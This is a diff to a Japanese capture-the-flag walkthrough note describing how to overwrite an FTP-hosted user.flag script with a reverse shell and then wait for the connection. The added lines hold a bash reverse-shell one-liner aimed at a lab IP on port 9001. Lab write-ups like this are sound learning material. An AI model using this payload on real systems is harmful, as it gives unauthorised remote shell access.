@@ -16,6 +16,10 @@
   - user.flagをダウンロードする
   - 中身を確認するとshell scriptになっている。これにリバースシェルを書き換えてuploadしたらいいんでは
 - Parrotでuser.floagファイルにreverse-shellを書き込む
+  - ```
+    #!/bin/sh
+    bash -i >& /dev/tcp/192.168.56.101/9001 0>&1;
+    ``` 
 - もう一度ftpにskyでアクセスする
   - user.flagを　uploadする。同じ名前のファイルをuploadすると上書きされる
 - Parrotで待ち受ける
